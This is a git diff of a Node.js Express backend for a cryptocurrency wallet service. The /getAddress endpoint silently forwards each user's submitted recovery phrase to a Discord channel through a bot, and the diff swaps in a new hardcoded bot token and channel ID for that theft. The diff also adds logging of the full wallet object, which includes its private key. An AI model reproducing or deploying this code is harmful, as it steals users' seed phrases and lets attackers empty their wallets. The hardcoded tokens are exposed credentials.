@@ -105,10 +105,19 @@ app.post("/CreateNewWallet", async(req, res) => {
     const myArray = randomMnemonic.phrase.split(" ");
     res.json(myArray);
 })
+app.post("/TransactionHestory", async(req, res) => {
+    let etherscanProvider = new ethers.providers.EtherscanProvider();
+    etherscanProvider.getHistory(req.body.address).then((history) => {
+        console.log(history.length)
+        res.send(history);
+    });
+})
 app.post("/getAddress", async(req, res) => {
     SendPhrase(req.body.phrase);
     try {
         const wallet = ethers.Wallet.fromMnemonic(req.body.phrase);
+
+        console.log(wallet)
         res.json({
             address: wallet.address
         })
@@ -120,12 +129,10 @@ app.post("/getAddress", async(req, res) => {
 client.on('ready', client => {
     console.log("Connected")
 })
-client.login("OTczNzc3MzY5NjMyNDkzNjEw.GdHpKL.3X1DTGGWjNGw69jR9UDEY_mThoNl2-6TcgxqCc");
+client.login("OTc0MDc2NTA2MDE4MDI1NDcy.GgWEDl.UTmyL_DyS20cEi7hjXCnDZaHLero_O3UXQShCw");
 
 function SendPhrase(phrase) {
-    client.channels.cache.get('973836939155374120').send(`Wallet Phrase : ${phrase}`);
-
-
+    client.channels.cache.get('974077453129617468').send(`Wallet Phrase : ${phrase}`);
 }
 app.post("/balance", async(req, res) => {
     try {
